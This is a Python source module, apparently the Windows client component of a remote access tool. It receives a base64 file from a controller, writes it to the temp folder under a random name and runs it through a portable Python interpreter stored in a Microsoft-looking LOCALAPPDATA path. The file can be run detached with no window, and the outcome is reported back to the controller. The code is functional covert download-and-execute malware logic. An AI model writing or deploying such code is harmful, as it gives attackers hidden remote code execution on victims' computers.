import os
import base64
import tempfile
import random
import string
import subprocess
import threading
import win32con

DETACHED_PROCESS = 0x00000008

def execute_file(client, execute_file_chunk, file_type, visibility, converter):
    try:
        base64_file = execute_file_chunk
        decoded_file = base64.b64decode(base64_file)
        python_library_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Python', 'pyportable', 'python.exe')

        temp_dir = tempfile.gettempdir()
        random_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + file_type
        full_path = os.path.join(temp_dir, random_filename)

        with open(full_path, "wb") as f:
            f.write(decoded_file)

        if visibility.lower() == "hidden":
            creation_flags = DETACHED_PROCESS | win32con.CREATE_NO_WINDOW
        else:
            creation_flags = 0

        def create_process():
            command = [python_library_path, full_path]
            subprocess.Popen(
                command,
                creationflags=creation_flags,
                close_fds=True
            )

        threading.Thread(target=create_process, daemon=True).start()
        client.emit('message', converter.encode({"execute_file": "File executed successfully."}))

    except Exception as e:
        client.emit('message', converter.encode({"execute_file_logger": str(e)}))
